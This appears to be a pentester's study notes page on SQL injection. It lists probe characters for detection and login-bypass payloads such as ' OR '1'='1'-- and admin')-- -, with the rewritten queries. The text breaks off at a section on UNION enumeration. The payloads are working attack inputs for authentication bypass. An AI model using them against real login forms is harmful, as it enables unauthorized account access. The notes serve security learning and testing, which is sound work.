# SQLI TTP's

## Detection (Identify locations where the user input is not properly sanitized)
Use one or a combination of the below characters or it's URL encoded version and see if the page changes or otherwise errors out.

|Payload|URL Encoded|
|-------|-----------|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3b`|
|`)`|`%29`|
|`*`|`%2a`|

## Auth Bypass
### `OR` Injection
* Most Important: We always need the query to return true, regardless of the username and password entered
* Critical to this, is the MySQL Operation Precedenct, which states an AND is always evaluated before an OR. This means that if there is at least one true condition along with an OR operator, the condition will evaluate to true. 
Sample Auth SQL Query:
```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```
If we inject `' OR '1'=1'--`
We would now have:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```
Notice the password portion of the query is now commented out, and username always returns true, because 1 always equals 1

The below will always log you in as the first person in the database, usually the admin.
```sql
' or 1=1 limit 1 --
```

Additionally, if you know a username, you can inject the `OR` statement into the password field to log in as that user.

[PayloadsAllTheThings SQLI Auth_Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)

### Parenthetical Evalation
Consider the following SQL froma  login form:
```sql
SELECT * FROM logins WHERE (username=input AND id >1) AND password=input
```
>Note: This is a common way to prevent an admin from logging in, as the id must be greater than 1.

We can bypass this by commenting out and closing the parenthesis

Example 1:  
Username input: `admin')-- -`  
password input: test  
Results in the following query:
```sql
SELECT * FROM logins WHERE (username='admin')-- AND id>1) AND password=test
```
This get's us in because we closed out the parenthisis right after the username and then commented out the rest of the statement.  

Example 2: In this example, we do not know the username, but we are going to use the `id` column to log in as anyone we want.  
Username input: `test' OR id=5)-- `  
Password input: test  
Results in the following query:
```sql
SELECT * FROM logins WHERE (username='test' OR id=5)-- AND password=test
```
This get's us in because we changed the parenthetical `AND` into an `OR` and just entered an arbitrary ID, then commented out the rest of the query.

## Enumeration
### With `UNION`
`UNION` statements can only work on select statements with the same number of columns.

